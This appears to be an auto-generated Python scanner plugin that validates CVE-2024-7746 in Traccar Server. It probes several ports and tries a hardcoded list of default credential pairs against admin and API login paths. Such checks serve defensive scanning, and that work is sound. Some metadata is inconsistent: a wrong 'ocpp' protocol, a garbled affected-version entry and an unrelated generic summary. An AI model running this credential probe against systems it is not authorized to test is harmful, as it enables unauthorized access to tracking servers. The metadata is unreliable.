#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, http_default_creds_probe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 49,
    "cve": "CVE-2024-7746",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Automotive embedded component",
    "component": "车载软件组件",
    "type": "输入校验/认证缺陷",
    "summary": "ASRG披露的车载组件漏洞，需跟踪厂商修复。",
    "source_description": "Use of Default Credentials vulnerability in Tananaev Solutions Traccar Server on Administrator Panel modules allows Authentication Abuse.This issue affects the privileged transactions implemented by the Traccar solution that should otherwise be protected by the authentication mechanism. \nThese transactions could have an impact on any sensitive aspect of the platform, including Confidentiality, Integrity and Availability.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-7746",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-7746",
        "https://asrg.io/security-advisories/cve-2024-7746/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-7746"
    ],
    "affected": [
        {
            "vendor": "Traccar",
            "product": "Server",
            "versions": [
                {
                    "version": "2.12",
                    "status": "unaffected",
                    "lessThanOrEqual": "6.2",
                    "versionType": "git"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-7746",
        "Automotive",
        "embedded",
        "component",
        "Default",
        "Credentials",
        "vulnerability",
        "Tananaev",
        "Solutions",
        "Traccar",
        "Server",
        "Administrator",
        "Panel",
        "modules",
        "Authentication",
        "Abuse.This",
        "issue",
        "affects",
        "privileged",
        "transactions",
        "implemented",
        "solution",
        "should",
        "otherwise",
        "protected",
        "authentication",
        "mechanism",
        "These",
        "could",
        "have"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-7746: Traccar Server admin panel default credential abuse."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8082))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2024-7746",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP default credential probe - Traccar Server administrator panel",
    }

    active_port = None
    for try_port in [port, 8082, 5055, 80, 443, 8080]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port

    cred_result = http_default_creds_probe(
        target_ip, active_port, tls,
        paths=["/api/session", "/api/users", "/api/v1/user", "/admin", "/login"],
        cred_pairs=[
            ("admin", "admin"), ("admin", ""), ("admin", "1234"),
            ("root", "root"), ("user", "user"), ("admin", "password"),
            ("admin", "admin123"), ("guest", "guest"),
        ],
    )
    evidence["credential_probe"] = cred_result

    if cred_result.get("success"):
        evidence["default_creds_found"] = True
        evidence["credential"] = cred_result.get("credential")
        return {
            "vulnerable": True,
            "evidence": evidence,
            "detection_confidence": detection_confidence("B", evidence, "default_credential_confirmed"),
            "requires_manual_review": False,
        }

    probe = HTTPProbe(target_ip, active_port, tls=tls)
    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("B", evidence, "default_creds_not_found"),
        "requires_manual_review": True,
    }

class Poc42CVE20247746InputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-049'
    meta_poc_name = 'CVE-2024-7746 认证缺陷 Active Validation'
    meta_cve_id = 'CVE-2024-7746'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-7746'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-7746']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "42_Automotive_Component_Input_Validation_Auth_Audit") if "VULN" in dir() else "42_Automotive_Component_Input_Validation_Auth_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc42CVE20247746InputValidationAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
